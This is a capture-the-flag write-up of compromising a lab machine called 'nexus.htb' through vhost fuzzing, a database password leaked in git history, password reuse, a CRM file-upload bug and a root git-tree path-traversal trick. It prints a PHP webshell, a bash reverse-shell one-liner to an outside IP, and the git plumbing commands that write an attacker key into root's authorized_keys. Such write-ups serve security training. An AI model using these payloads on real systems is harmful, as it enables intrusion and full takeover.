# Enumeration

Full TCP scan first, no assumptions:

```
$ nmap -p- -T4 --min-rate 3000 10.129.234.54
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -p22,80 -sV -sC 10.129.234.54
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

Only two ports. `nexus.htb` goes in `/etc/hosts` and resolves to a single-page marketing site
for a fictional "Nexus Energy Authority": gradients, a careers section, a testimonial
carousel. No forms, no JS calls to a backend, nothing dynamic. `curl -i` confirms it's a plain
static file (`ETag`, `Last-Modified`, `Accept-Ranges`, nginx `sendfile`). Directory brute force
finds nothing else, not even `robots.txt`.

So this page is a decoy, not the target. The real app is behind a vhost that was never linked
anywhere on the site.

A first vhost fuzz (20k words) looked promising at first, dozens of hits, but they were all
the same thing: nginx's `server_name` fallback 302-redirects any unmatched `Host:` header back
to `nexus.htb`.

```
$ curl -s -i -H "Host: totallybogusvhost12345.nexus.htb" http://10.129.234.54/
HTTP/1.1 302 Moved Temporarily
Location: http://nexus.htb/
Content-Length: 154
```

Once that 154-byte catch-all body is known, it's easy to filter it out and re-run the fuzz
against a much bigger wordlist (114k candidates):

```
$ ffuf -u http://10.129.234.54/ -H "Host: FUZZ.nexus.htb" \
       -w subdomains-top1mil.txt -fs 154 -t 100

git.nexus.htb      [Status: 200, Size: 14472]
billing.nexus.htb  [Status: 302, Size: 390]
```

Two real vhosts. `git.nexus.htb` is a Gitea instance. `billing.nexus.htb` redirects to
`/admin/login` and drops a cookie named `krayin_crm_session`, so it's Krayin CRM, a
Laravel-based open source CRM. The careers page mentioned "Operations Specialist, Customer
Platforms" and name-dropped Salesforce/HubSpot, that turned out to be the fingerprint for this.

# Initial Access

Gitea allows anonymous browsing. There's one public repo, `admin/krayin-docker-setup`, with a
deployment `.env` and a `docker-compose.yml`. The current `.env` has `DB_PASSWORD=` blank,
looks sanitized. But there are two commits on that file, and the diff between them tells a
different story:

```
$ curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/<sha>.diff

-APP_URL=http://nexus.htb
+APP_URL=http://billing.nexus.htb
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

The first commit shipped a real MySQL password, the second one blanked the field to "fix" it.
Git history still has it, and the Gitea API serves old diffs to anyone anonymous. A redacted
secret in the latest commit is not a redacted secret.

`billing.nexus.htb` had `Facade\Ignition` live with `APP_DEBUG=true` and
`can_execute_commands:true` on `/_ignition/health-check`, which smells like the classic
CVE-2021-3129 Laravel debug RCE. Checked it and dropped it fast: the app fingerprints as
Laravel 12.54.1 on PHP 8.3.6, way past the vulnerable dependency graph that gadget chain needs.

So the actual move is credential reuse. Sprayed the leaked DB password against a short list of
emails scraped from the site and from Gitea (`admin@nexus.htb`, `admin@example.com`,
`j.matthew@nexus.htb`, ...):

```
SUCCESS: j.matthew@nexus.htb / N27xh!!2ucY04  ->  /admin/dashboard
```

`j.matthew` is the "hiring manager" listed on the decoy careers page, and he was reusing the
password from the leaked docker setup. We're in as a valid Krayin CRM user.

Authenticated Krayin CRM v2.2.x has an unrestricted file upload on its WYSIWYG image endpoint
(CVE-2026-38526), no extension check, no content type validation:

```python
files = {"file": ("shell.php", open("shell.php", "rb"), "image/jpeg")}
r = client.post(f"{BASE}/admin/tinymce/upload", files=files, headers=xsrf_header)
# {"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}
```

```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

```
$ curl "http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Webshell confirmed, upgrade to a reverse shell:

```
$ curl -G ".../shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.95/4444 0>&1'"
$ nc -lvnp 4444
www-data@nexus:~/krayin/storage/app/public/tinymce$
```

# Lateral Movement

The docker-leaked password was already rotated once. The real `.env` on disk has a different
one:

```
$ cat /var/www/krayin/.env
DB_PASSWORD=y27xb3ha!!74GbR
```

Local system users with a real shell:

```
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

Same trick, one more time:

```
$ sshpass -p 'y27xb3ha!!74GbR' ssh jones@nexus.htb id
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)

$ cat /home/jones/user.txt
[REDACTED]
```

**user.txt**: `[REDACTED]`

`sudo -l` for jones comes back empty, no rule at all, so no easy sudo path. Time to look at
what's running as root instead.

# Privilege Escalation

There's a companion script under `/etc/gitea/`, world-readable, wired into systemd:

```
$ systemctl cat gitea-template-sync.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py

$ systemctl cat gitea-template-sync.timer
OnBootSec=1min
OnUnitActiveSec=1min
```

Every sixty seconds, as root, this asks the Gitea API for any repo flagged as a template, walks
its tree with `git ls-tree -r HEAD`, and writes each blob to disk:

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)   # filepath comes straight from git
    ...
    with open(target, 'wb') as f:
        f.write(cat_result.stdout)                # no sanitization at all
```

`filepath` is whatever `git ls-tree` prints, and a git tree entry can legally be named `..`,
git only sees it as bytes. `git mktree` will happily build nested trees out of `..` entries,
nobody checks for that here, and that's the whole bug.

Logged into Gitea as `jones` (same reused password), created a repo through the API with
`"template": true`, then built a malicious tree by hand with raw plumbing commands, no working
directory, just objects:

```bash
BLOB=$(git hash-object -w root_key.pub)
T7=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)   # .ssh/
T6=$(printf '040000 tree %s\t.ssh\n' "$T7"              | git mktree)   # root/
T5=$(printf '040000 tree %s\troot\n' "$T6"              | git mktree)
T4=$(printf '040000 tree %s\t..\n'   "$T5"              | git mktree)   # five ".." levels
T3=$(printf '040000 tree %s\t..\n'   "$T4"              | git mktree)   # to walk back out
T2=$(printf '040000 tree %s\t..\n'   "$T3"              | git mktree)   # of template-staging
T1=$(printf '040000 tree %s\t..\n'   "$T2"              | git mktree)   # and land at /
T0=$(printf '040000 tree %s\t..\n'   "$T1"              | git mktree)

$ git ls-tree -r $T0
100644 blob c422aa9... ../../../../../root/.ssh/authorized_keys
```

Committed it and pushed over HTTPS with basic auth. No fsck complaints:

```
$ git push origin main:main --force
 + 2f7ce0e...0970eec main -> main (forced update)
```

Sixty seconds later the timer fires as root, resolves
`../../../../../root/.ssh/authorized_keys` exactly the way a shell would, and writes our public
key straight into root's keyring:

```
$ ssh -i nexus_root_key root@nexus.htb 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root)
[REDACTED]
```

**root.txt**: `[REDACTED]`

Notes for later: a polished front-end is not the attack surface, it's camouflage, the real box
was two vhosts behind it. Redacting a secret in a new commit does nothing, git history keeps it
forever. Password reuse chained the whole box together: docker secret, CRM account, `.env` on
disk, SSH, Gitea, all the same password rotated twice. And the template sync script is a good
reminder that `git ls-tree` output is attacker controlled the moment someone can push to any
repo the script touches. Nobody asked "can a tree entry be named `..`", the answer is yes.

🪐 Hack The Planet 🪐
